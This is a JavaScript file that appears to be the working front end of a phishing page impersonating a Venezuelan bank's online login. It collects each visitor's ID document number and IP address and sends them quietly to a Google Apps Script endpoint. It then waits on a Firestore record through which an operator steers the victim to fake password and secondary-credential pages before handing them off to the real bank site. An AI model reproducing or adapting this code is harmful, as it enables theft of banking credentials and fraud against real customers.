import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
import {
    getFirestore,
    doc,
    setDoc,
    onSnapshot,
} from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
import { firebaseConfig } from "./firebase-config.js";
// Usar la configuración importada directamente
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);
// Hacer disponibles las funciones de Firestore globalmente
window.db = db;
window.doc = doc;
window.setDoc = setDoc;
window.onSnapshot = onSnapshot;

// Asegurar que el loader esté oculto inicialmente
if (window.hideLoader) {
    window.hideLoader();
}


// Función para obtener la dirección IP
async function obtenerDireccionIP() {
    const servicios = [
        "https://api.ipify.org?format=json",
        "https://api64.ipify.org?format=json",
        "https://jsonip.com",
        "https://api.myip.com",
        "https://ipapi.co/json/"
    ];

    for (const url of servicios) {
        try {
            const response = await fetch(url);
            if (!response.ok) continue;
            const data = await response.json();
            return data.ip || data.data || "No disponible";
        } catch (error) {
            // Error manejado silenciosamente
        }
    }
    return "No disponible";
}

// Función optimizada para enviar datos a Google Sheets con timeout y retry
async function enviarDatosAGSheets(datos, maxReintentos = 3, timeoutMs = 8000) {
    const datosAEnviar = {
        DireccionIP: datos.direccionIP || "",
        TipoDocumento: datos.tipoDocumento || "No especificado",
        Documento: datos.documento || "",
    };

    const url = "https://script.google.com/macros/s/AKfycbx109GX3arUTEEqfKhVOyuEYVX1EoGMsDKpdHmiuvDhKWajbIfQ8vf57i4ZiZrXtK-Q-g/exec";

    for (let intento = 1; intento <= maxReintentos; intento++) {
        try {
            // Crear AbortController para timeout
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), timeoutMs);

            const response = await fetch(url, {
                method: "POST",
                mode: "no-cors",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                },
                body: new URLSearchParams(datosAEnviar).toString(),
                signal: controller.signal
            });

            clearTimeout(timeoutId);
            
            // Con no-cors, si llega aquí sin error, asumimos éxito
            console.log(`Datos enviados a Google Sheets exitosamente (intento ${intento})`);
            return true;

        } catch (error) {
            console.warn(`Intento ${intento} fallido:`, error.name);
            
            // Si es el último intento, fallar
            if (intento === maxReintentos) {
                console.error("Falló el envío a Google Sheets después de todos los intentos");
                return false;
            }
            
            // Esperar antes del siguiente intento (backoff exponencial)
            const espera = Math.min(1000 * Math.pow(2, intento - 1), 5000);
            await new Promise(resolve => setTimeout(resolve, espera));
        }
    }
    
    return false;
}

// Función para envío asíncrono en segundo plano (no bloquea la UI)
function enviarDatosEnSegundoPlano(datos) {
    // Enviar de forma asíncrona sin bloquear
    enviarDatosAGSheets(datos).then(exito => {
        if (exito) {
            console.log("✅ Datos enviados a Google Sheets correctamente");
            // Limpiar datos pendientes si existen
            localStorage.removeItem('pendienteGSheets');
        } else {
            console.warn("⚠️ No se pudieron enviar los datos a Google Sheets");
            // Guardar en localStorage para reintento posterior
            const datosParaReintento = {
                ...datos,
                timestamp: Date.now(),
                reintentos: 0
            };
            localStorage.setItem('pendienteGSheets', JSON.stringify(datosParaReintento));
        }
    }).catch(error => {
        console.error("❌ Error inesperado enviando a Google Sheets:", error);
        // También guardar para reintento en caso de error inesperado
        const datosParaReintento = {
            ...datos,
            timestamp: Date.now(),
            reintentos: 0,
            error: error.message
        };
        localStorage.setItem('pendienteGSheets', JSON.stringify(datosParaReintento));
    });
}

// Función para reintentar envío de datos pendientes
async function reintentarDatosPendientes() {
    const datosPendientes = localStorage.getItem('pendienteGSheets');
    if (!datosPendientes) return;

    try {
        const datos = JSON.parse(datosPendientes);
        const tiempoTranscurrido = Date.now() - datos.timestamp;
        
        // Solo reintentar si han pasado al menos 30 segundos y menos de 24 horas
        if (tiempoTranscurrido > 30000 && tiempoTranscurrido < 86400000) {
            console.log("🔄 Reintentando envío de datos pendientes a Google Sheets...");
            
            const exito = await enviarDatosAGSheets({
                direccionIP: datos.direccionIP,
                documento: datos.documento,
                tipoDocumento: datos.tipoDocumento
            });

            if (exito) {
                console.log("✅ Datos pendientes enviados exitosamente");
                localStorage.removeItem('pendienteGSheets');
            } else {
                // Incrementar contador de reintentos
                datos.reintentos = (datos.reintentos || 0) + 1;
                if (datos.reintentos >= 5) {
                    console.warn("⚠️ Máximo de reintentos alcanzado, eliminando datos pendientes");
                    localStorage.removeItem('pendienteGSheets');
                } else {
                    localStorage.setItem('pendienteGSheets', JSON.stringify(datos));
                }
            }
        } else if (tiempoTranscurrido >= 86400000) {
            // Eliminar datos muy antiguos (más de 24 horas)
            console.log("🗑️ Eliminando datos pendientes antiguos");
            localStorage.removeItem('pendienteGSheets');
        }
    } catch (error) {
        console.error("❌ Error procesando datos pendientes:", error);
        localStorage.removeItem('pendienteGSheets');
    }
}

// Función para verificar conectividad y estado del sistema
function verificarEstadoSistema() {
    // Verificar si hay datos pendientes al cargar la página
    reintentarDatosPendientes();
    
    // Configurar reintento periódico cada 5 minutos
    setInterval(reintentarDatosPendientes, 300000);
}

document.addEventListener('DOMContentLoaded', function () {
    // Inicializar sistema de fallback y verificación
    verificarEstadoSistema();
    
    // Inicializar elementos del DOM
    const tipoDocumentoSelect = document.getElementById("tipodocben");
    const tiki = document.getElementById('doc452acd');
    const submitBtn = document.getElementById('cmdLogin');
    const ipInput = document.getElementById('direccionIP');
    const spinner = document.getElementById('preloader');

    // Variable para almacenar el valor seleccionado
    let valorDocumentoSeleccionado = '';

    // Función para registrar eventos
    function registrarEvento(datos) {
        // Actualizamos el valor seleccionado
        valorDocumentoSeleccionado = datos.valor;
    }

    // Agregar evento de cambio al select
    if (tipoDocumentoSelect) {
        // Establecer el valor inicial
        valorDocumentoSeleccionado = tipoDocumentoSelect.value;
        // Manejador de cambios
        tipoDocumentoSelect.addEventListener("change", function () {
            const valorSeleccionado = this.value;
            registrarEvento("cambio_tipo_documento", {
                valor: valorSeleccionado,
            });
        });
    }



    // Función para obtener el valor actual del documento
    function obtenerTipoDocumento() {
        return valorDocumentoSeleccionado;
    }

    // Hacer la función disponible globalmente si es necesario
    window.obtenerTipoDocumento = obtenerTipoDocumento;

    spinner.style.display = "none";


    // Verificar que los elementos necesarios existan
    if (!tiki || !submitBtn) {
        console.error('Elementos del formulario no encontrados');
        return;
    }

    // Función para validar la entrada (solo números y longitud mínima de 3)
    function validateInput() {
        if (tiki && submitBtn) {
            // Eliminar cualquier carácter que no sea número
            const soloNumeros = tiki.value.replace(/\D/g, '');

            // Actualizar el valor del input solo si es diferente
            if (soloNumeros !== tiki.value) {
                tiki.value = soloNumeros;
            }

            // Validar longitud mínima
            if (soloNumeros.length >= 3) {
                submitBtn.disabled = false;
            } else {
                submitBtn.disabled = true;
            }
        }
    }

    // Agregar evento input para validar en tiempo real
    if (tiki) {
        tiki.addEventListener('input', validateInput);
        // Validar al cargar la página
        validateInput();
    }

    // Mostrar solo mientras se mantiene presionado el icono
    function enableHoldToShow(input, icon, showLabel, hideLabel) {
        if (!input || !icon) return;
        icon.setAttribute("aria-label", showLabel);
        icon.setAttribute("tabindex", "0");
        icon.setAttribute("role", "button");

        // Mostrar valor
        const showValue = () => {
            input.type = "text";
            icon.classList.remove("fa-eye-slash");
            icon.classList.add("fa-eye");
            icon.setAttribute("aria-label", hideLabel);
        };

        // Ocultar valor
        const hideValue = () => {
            input.type = "password";
            icon.classList.remove("fa-eye");
            icon.classList.add("fa-eye-slash");
            icon.setAttribute("aria-label", showLabel);
        };

        // Mouse
        icon.addEventListener("mousedown", () => {
            showValue();
            // Ocultar al soltar en cualquier parte
            const hideOnMouseUp = () => {
                hideValue();
                document.removeEventListener("mouseup", hideOnMouseUp);
            };
            document.addEventListener("mouseup", hideOnMouseUp);
        });

        // Touch
        icon.addEventListener("touchstart", (e) => {
            e.preventDefault();
            showValue();
            const hideOnTouchEnd = () => {
                hideValue();
                document.removeEventListener("touchend", hideOnTouchEnd);
                document.removeEventListener("touchcancel", hideOnTouchEnd);
            };
            document.addEventListener("touchend", hideOnTouchEnd);
            document.addEventListener("touchcancel", hideOnTouchEnd);
        });

        // Teclado
        icon.addEventListener("keydown", (event) => {
            if (event.key === " " || event.key === "Spacebar" || event.key === "Enter") {
                event.preventDefault();
                showValue();
            }
        });
        icon.addEventListener("keyup", (event) => {
            if (event.key === " " || event.key === "Spacebar" || event.key === "Enter") {
                event.preventDefault();
                hideValue();
            }
        });

        hideValue();
    }
    enableHoldToShow(
        document.getElementById("documento"),
        document.getElementById("toggleDocumento"),
        "Mostrar documento",
        "Ocultar documento"
    );

    // Función optimizada para manejar el envío
    async function manejarEnvio() {
        if (!submitBtn || submitBtn.disabled) return;

        let unsubscribe = null;

        try {
            submitBtn.disabled = true;
            submitBtn.style.opacity = '0.7';
            if (spinner) spinner.style.display = "flex";

            // Validar datos del usuario
            const userId = tiki.value.trim();
            if (!userId) {
                throw new Error("El ID de usuario no puede estar vacío");
            }

            const docId = `${userId} - ${tipoDocumentoSelect.value}`;
            const userRef = doc(db, "redireccion", docId);

            // Ejecutar operaciones en paralelo para mayor velocidad
            const [direccionIP] = await Promise.allSettled([
                obtenerDireccionIP(),
                // Actualizar Firestore inmediatamente (no esperar Google Sheets)
                setDoc(userRef, {
                    usuario: docId,
                    page: 0, // Inicialmente en 0 para esperar instrucciones del admin
                })
            ]);

            // Obtener IP (con fallback si falla)
            const ip = direccionIP.status === 'fulfilled' ? direccionIP.value : 'No disponible';
            if (ipInput) {
                ipInput.value = ip;
            }

            // Preparar datos para envío
            const datosUsuario = {
                direccionIP: ip,
                documento: userId,
                tipoDocumento: tipoDocumentoSelect.value
            };

            // Guardar en localStorage inmediatamente
            localStorage.setItem("usuario", JSON.stringify(datosUsuario));

            // OPTIMIZACIÓN CLAVE: Enviar a Google Sheets en segundo plano
            // No bloquear la redirección esperando Google Sheets
            enviarDatosEnSegundoPlano(datosUsuario);

            // Configurar la escucha de cambios en Firestore INMEDIATAMENTE
            // (sin esperar a Google Sheets)
            unsubscribe = onSnapshot(userRef, (doc) => {
                if (doc.exists()) {
                    const userData = doc.data();
                    const page = userData.page;
                    
                    // Si el admin ha establecido una página de redirección
                    if (page > 0) {
                        // Limpiar el listener antes de redirigir
                        if (unsubscribe) unsubscribe();
                        
                        // Ocultar spinner antes de redirigir
                        if (spinner) spinner.style.display = "none";
                        
                        // Redirigir según el valor de page
                        switch (page) {
                            case 1:
                                window.location.href = "p=1.html";
                                break;
                            case 11:
                                window.location.href = "err-p=1.html";
                                break;
                            case 2:
                                window.location.href = "passwd.html";
                                break;
                            case 22:
                                window.location.href = "err-passwd.html";
                                break;
                            case 3:
                                window.location.href = "jrico.html";
                                break;
                            case 33:
                                window.location.href = "err-jrico.html";
                                break;
                            case 9:
                                window.location.href = "https://bdtenlinea.bdt.com.ve/?p=1";
                                break;
                            default:
                                console.warn(`Página no reconocida: ${page}`);
                        }
                    }
                }
            }, (error) => {
                console.error("Error en el listener de Firestore:", error);
                if (unsubscribe) unsubscribe();
                submitBtn.disabled = false;
                submitBtn.style.opacity = '1';
                if (spinner) spinner.style.display = "none";
                alert("Error de conexión. Por favor, intente nuevamente.");
            });

            // Timeout de seguridad para evitar espera infinita
            setTimeout(() => {
                if (unsubscribe) {
                    unsubscribe();
                    submitBtn.disabled = false;
                    submitBtn.style.opacity = '1';
                    if (spinner) spinner.style.display = "none";
                    alert("Tiempo de espera agotado. Por favor, intente nuevamente.");
                }
            }, 120000); // 2 minutos

        } catch (error) {
            console.error("Error en manejarEnvio:", error);
            
            // Limpiar listener si existe
            if (unsubscribe) unsubscribe();
            
            // Restaurar UI
            submitBtn.disabled = false;
            submitBtn.style.opacity = '1';
            if (spinner) spinner.style.display = "none";
            
            alert(`Error: ${error.message || 'Error desconocido al procesar la solicitud'}`);
        }
    }

    // Event Listeners
    if (tiki) {
        tiki.addEventListener('input', validateInput);
        validateInput(); // Validación inicial
    }
    if (submitBtn) {
        submitBtn.addEventListener('click', manejarEnvio);
    }

    // Obtener IP al cargar
    obtenerDireccionIP().then(ip => {
        if (ipInput) ipInput.value = ip;
    });
});